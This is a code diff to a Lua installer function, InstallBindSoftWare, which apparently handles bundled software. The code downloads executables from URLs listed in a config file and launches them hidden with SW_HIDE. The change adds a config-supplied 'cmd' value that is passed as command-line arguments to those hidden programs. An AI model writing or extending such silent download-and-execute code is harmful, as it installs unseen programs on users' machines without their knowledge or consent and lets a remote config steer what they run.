@@ -220,6 +220,7 @@ function InstallBindSoftWare(strBindConfigPath)
 		Log("[InstallBindSoftWare] strInstall = " .. GTV(strInstall) .. ", bInstall = " .. GTV(bInstall))
 		if bInstall and strInstall == "1" then
 			local strUrl, bUrl = apiUtil:ReadINI(strBindConfigPath, "bindinfo" .. tostring(iBindIndex), "url")
+			local strCmd, bCmd = apiUtil:ReadINI(strBindConfigPath, "bindinfo" .. tostring(iBindIndex), "cmd")
 			Log("[InstallBindSoftWare] strUrl = " .. GTV(strUrl) .. ", bUrl = " .. GTV(bUrl))
 			if bUrl and IsRealString(strUrl) then
 				local strStamp = FunctionObj.GetTimeStamp()
@@ -231,14 +232,17 @@ function InstallBindSoftWare(strBindConfigPath)
 					strSaveName = "bindinfo" .. tostring(iBindIndex) .. ".exe"
 				end
 				strExeSavePath = apiUtil:PathCombine(strExeSavePath,strSaveName) 
-				
+				local strCommand = ""
+				if bCmd and IsRealString(strCmd) then
+					strCommand = strCmd
+				end
 				FunctionObj.NewAsynGetHttpFile(strExeUrlWithStmp, strExeSavePath, false
 					, function(bRet, strRealPath)
 						Log("[InstallBindSoftWare] bRet:"..tostring(bRet)
 								.." strRealPath:"..tostring(strRealPath))
 								
 						if 0 == bRet then
-							apiUtil:ShellExecute(0, "open", strRealPath, "", 0, "SW_HIDE")
+							apiUtil:ShellExecute(0, "open", strRealPath, strCommand, 0, "SW_HIDE")
 							local tStatInfo = {}
 							tStatInfo.strEC = "dclsettuplua"
 							tStatInfo.strEA = "bindinstall"
